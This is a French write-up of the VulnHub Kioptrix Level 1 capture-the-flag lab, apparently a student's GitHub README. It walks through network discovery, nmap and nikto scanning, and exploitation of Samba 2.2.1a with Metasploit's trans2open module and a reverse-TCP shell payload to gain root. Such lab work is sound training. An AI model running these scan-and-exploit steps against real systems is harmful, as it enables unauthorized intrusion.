## Installation

Installer mon projet avec   

```
https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar
```
  
# --------------------------------------------
## NETDISCOVER 

Je commence par scanner le réseaux avec la commande
netdiscover -r 192.168.91.0/24.
J'utilise l'attribut ```-r``` pour scanner un réseaux spécifique (plage d'adresses IP) .

![Netdiscover](/SCREEN/netdiscover.png)
![NETDISCOVERRESULTAT](/SCREEN/resultatnetdiscover.png)
Pour voir si la machine est en marche je vais utiliser fping . 
![fping](/SCREEN/fping.png)
La machine étant bien en marche je vais donc pouvoir lancer un nmap.
## NMAP

![NMAP](/SCREEN/nmap.png)

```bash
  nmap -sC -sV -p IP
```

Les options que j'ai choisit sont : 
-sC :Utilise l'ensemble de scripts par défaut. Cela équivaut à --script=default.
-sV : Détection de version
-p : Pour les ports
![resultat](/SCREEN/name.png)

On remarque donc que nous sommes bien sur la bonne machine cible .
![nmapresultat](/SCREEN/nmapresultat.png)

On remarque donc que nous avons du :
-SSH avec openSSH en version 2.9p2 
-Du Web avec les protocoles ( 80 et 443 )
-SMB (on ne connait pas encore la version)
-RPC 

## METASPLOIT 

Dans Kali, vous devrez démarrer le serveur postgresql avant d'utiliser la base de donnée
![nmapresultat](/SCREEN/systemctl.png)
Pour lancer metasploit depuis la console :
```
msfconsole 
```

![nmapresultat](/SCREEN/msfconsole.png)
Puis après je viens exécuter la commande : 
```
msfdb init
```

Puis je vais créer mon workspace :
![WORSPACE](/SCREEN/worksape.png)
Création de mon Worspace .

### Lister les adresses IP

Pour cette partie nous allons utiliser scanner :

![searchscanner](/SCREEN/searchscanner.png)
![searchscannerarp](/SCREEN/searcharp.png)

Je vais donc utiliser le n°0 
```
use 0
```
![searchscannerarp](/SCREEN/arpresult.png)
Puis en paramètre j'indique le réseau de ma machine en /24

L'IP de la machine est : 192.168.91.116

### Lister les ports ouverts
Pour lister les ports d'ouverts je vais venir utiliser db_nmap :

```
db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all 192.168.91.116 -p -
```

![dbnmap](/SCREEN/dbnmap.png)
SSH - Version : OpenSSH 2.9p2
Web - Version : Apache httpd 1.3.20

### BILAN

Pour utiliser nikto j'ai utiliser cette commande : 
```
nikto -h [IP] 
```
![nikto](/SCREEN/nikto.png)

Puis je me suis rendu sur exploit-db : 
![exploitdb](/SCREEN/exploitdb.png)
(J'ai indiqué dans mes critères de recherche la CVE-2002-0082)
Pour trouver la version smb de la machine cible j'utilise la commande : 
```
search scanner smb version
```
![search](/SCREEN/20.png)

Après avoir paramètrer :
```
set RHOSTS IP
set THREADS 1
run
```

![smbversion](/SCREEN/smbversion.png)

La version de notre Samba (SMB) est donc : Samba 2.2.1a

# Recherche des failles

Exemple avec OpenSSH 2.9

J'utilise : 
```
searchsploit
```

![SEARCHSPLOIT](/SCREEN/searchsploit.png)
[LIEN VERS LE .C](https://www.exploit-db.com/exploits/21671)

Son nom complet est : 
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow

# Exploitation

J'ai commencé par taper la commande suivante :
```
search exploit samba
```

![searchexploit](/SCREEN/searchexploit.png)

Je vais utiliser l'exploit :
```
linux/samba/trans2open
```
Car en me renseignant sur intenrent j'ai vu que l'exploit était compatible avec notre machine cible et qu'ils sont apparus à peu pres a la même date .
```
use n°16
```

Puis je vais venir set un payload avant de configurer mon exploit.

```
set payload /linux/x86/shell/reverse_tcp
```
Par la suite je configure mon exploit . je passe d'abord par un `show options`
Puis :
![configexploit](/SCREEN/configexploit.png)

Puis je run mon exploit

![runexploit](/SCREEN/runexploit.png)
On remarque donc que j'ai accès au droit de super-utilisateur .
# --------------------------------------------#
## Auteur
- [@theodufour](https://github.com/TheoDfr)
## Documentation
[Managing Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)
[Netdiscover](https://www.oreilly.com/library/view/kali-linux-2018/9781789341768/487203a3-1d14-44f1-8256-b3d97a46f63a.xhtml#:~:text=To%20launch%20Netdiscover%2C%20type%20netdiscover,ve%20used%20netdiscover%20–r%2010.10.)
[Nmap](https://nmap.org/man/fr/man-version-detection.html)
[Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
[Nikto](https://memo-linux.com/nikto-outil-scanner-de-securite-serveur-web/)
[Samba Exploit](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)

